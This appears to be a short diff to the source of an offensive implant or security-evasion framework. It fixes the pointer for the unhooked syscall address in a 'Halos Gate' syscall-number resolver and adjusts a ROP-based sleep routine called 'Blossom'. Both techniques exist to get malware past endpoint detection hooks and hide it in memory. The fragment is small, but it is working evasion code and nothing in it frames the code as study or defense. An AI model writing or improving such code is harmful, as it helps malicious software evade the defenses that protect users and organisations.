@@ -207,7 +207,7 @@ static bool declfn dynamic_ssn_syscall_retrieval(	uint32_t FunctionHash,
 		memory::zero(CheckTest + 4, 4);
 		if(hash_string(CheckTest) == CheckSum){
 			*SyscallServiceNumber	= (*(PDWORD)(AddressDown + 4)) - i;
-			*SyscallAddressJmp		= (PDWORD)(AddressUp + 18);
+			*SyscallAddressJmp		= (PDWORD)(AddressDown + 18);
 			#ifdef DEBUG
 			DBG("   \\__[+] Found SSN 0x%lx via Halos Gate with positive delta of %ld\n", *SyscallServiceNumber, i);
 			DBG("   |__[+] Found location of unhooked syscall opcode 0x%p\n", (void*)(*SyscallAddressJmp));
@@ -708,4 +708,5 @@ BYTE declfn instance::Blossom(DWORD Delay){
 		msvcrt.printf("[*] Going to sleep!!\n"); 
 	#endif
 	kernel32.RtlRestoreContext(&RopCTX, NULL);
+
 }
